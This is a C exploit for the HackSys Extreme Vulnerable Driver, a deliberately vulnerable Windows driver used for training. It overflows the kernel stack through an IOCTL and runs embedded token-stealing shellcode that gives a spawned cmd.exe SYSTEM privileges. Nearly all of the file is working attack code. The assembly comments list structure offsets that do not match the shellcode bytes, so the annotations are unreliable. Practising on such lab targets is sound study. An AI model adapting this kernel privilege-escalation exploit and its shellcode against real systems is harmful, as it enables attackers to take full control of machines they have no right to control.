#include <Windows.h>
#include <stdio.h>

#define IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define SIZE 2056 + 8

//[BITS 64]
//
//push rax
//push rbx
//push rcx
//push rsi
//push rdi
//
//mov rax, [gs:0x180 + 0x8]; Get 'CurrentThread' from KPRCB
//
//mov rax, [rax + 0x210]; Get 'Process' property from current thread
//
//next_process :
//cmp dword[rax + 0x180], 0x41414141; Search for 'cmd.exe' process('AAAA' replaced by exploit)
//je found_cmd_process
//mov rax, [rax + 0x188]; If not found, go to next process
//sub rax, 0x188
//jmp next_process
//
//found_cmd_process :
//mov rbx, rax; Save our cmd.exe EPROCESS for later
//
//find_system_process :
//cmp dword[rax + 0x180], 0x00000004; Search for PID 4 (System process)
//je found_system_process
//mov rax, [rax + 0x188]
//sub rax, 0x188
//jmp find_system_process
//
//found_system_process :
//mov rcx, [rax + 0x208]; Take TOKEN from System process
//mov[rbx + 0x208], rcx; And copy it to the cmd.exe process
//
//pop rdi
//pop rsi
//pop rcx
//pop rbx
//pop rax
char shellcode[256] = {
	0x50, 0x53, 0x51, 0x56, 0x57, 0x65, 0x48, 0x8b, 0x04, 0x25,
0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0x20, 0x02, 0x00,
0x00, 0x81, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x41, 0x41, 0x41,
0x41, 0x74, 0x0f, 0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00,
0x48, 0x2d, 0xe8, 0x02, 0x00, 0x00, 0xeb, 0xe5, 0x48, 0x89,
0xc3, 0x83, 0xb8, 0xe0, 0x02, 0x00, 0x00, 0x04, 0x74, 0x0f,
0x48, 0x8b, 0x80, 0xe8, 0x02, 0x00, 0x00, 0x48, 0x2d, 0xe8,
0x02, 0x00, 0x00, 0xeb, 0xe8, 0x48, 0x8b, 0x88, 0x58, 0x03,
0x00, 0x00, 0x48, 0x89, 0x8b, 0x58, 0x03, 0x00, 0x00, 0x5f,
0x5e, 0x59, 0x5b, 0x58, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};

int main()
{
	PDWORD lpflOldProtect;
	PDWORD lpflOldProtect2;

	// Obtain a handle to the device driver
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	// Check whether we successfully obtained a handle to the device driver. You cannot exploit the driver if you can't obtain a handle to it to start.
	if (hDriver == -1)
	{
		printf("[-] Unable to obtain a handle to the HEVD device driver.");
		return 0;
	}
	printf("[+] Obtained a handle to the HEVD device driver.");

	// In the code, we see that the required bytes to overflow is 2056 (rsp - 800h). We want to add both lengths together, to get the required bytes.
	// 2056 is rsp - 800h, rsp is 8 bytes long as it is a 64 bit register, which is the same size as a long (8 bytes). 8 + 800h = 8 + 2048 = 2056.
	// The last 8 bytes added is the register we will overwrite with our address to the payload, the rip register.
	char buffer[SIZE];

	// Fill the buffer with 'A'
	memset(buffer, 'A', SIZE);
	printf("\n[+] Crafted buffer filled with 'A's.");

	// Spawn a shell that will have its token swapped with the SYSTEM process token.
	printf("\n[*] Spawning a shell...");
	PROCESS_INFORMATION processInformation;
	STARTUPINFO startUpInfo;
	ZeroMemory(&processInformation, sizeof(processInformation));
	ZeroMemory(&startUpInfo, sizeof(startUpInfo));
	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startUpInfo, &processInformation))
	{
		printf("\n[-] Unable to spawn a shell.");
		return 0;
	}
	printf("\n[+] Spawned a shell.");
	Sleep(200);
	// Set the shellcode to replace the placeholder 41's with the process ID of our newly spawned shell.
	printf("\n[*] Mapping shellcode with the process information structure obtained from making the new process... Address: %p", (DWORD*)((char*)shellcode + 27));
	*(DWORD*)((char*)shellcode + 27) = processInformation.dwProcessId;

	// Set the last 8 bytes of the buffer to be equal to the address of our shellcode.
	printf("\n[*] Mapping the overflown RIP register with the address to our shellcode... Address: %p", (unsigned long long*)(buffer + 2056));
	*(unsigned long long*)(buffer + 2056) = (unsigned long long)shellcode;

	// Mark the shellcode buffer as execute, read, write. This is to prevent a kernel panic, as you cannot execute read only, write only, or read write memory.
	printf("\n[*] Marking the shellcode as read write execute (RWX)...");
	VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &lpflOldProtect);
	VirtualProtect(buffer, SIZE, PAGE_EXECUTE_READWRITE, &lpflOldProtect2);
	Sleep(200);

	// Exploit the vulnerability by sending the IO control code to the driver.
	printf("\n[*] One last thing... overflow the stack!");
	DeviceIoControl(hDriver, IOCTL, buffer, SIZE, NULL, 0, NULL, NULL);

	// Friendly reminder to our user.
	printf("\n[+] If you've reached this point, you should have admin access. I finally made my first f**king kernel mode exploit!");
	return 1;
}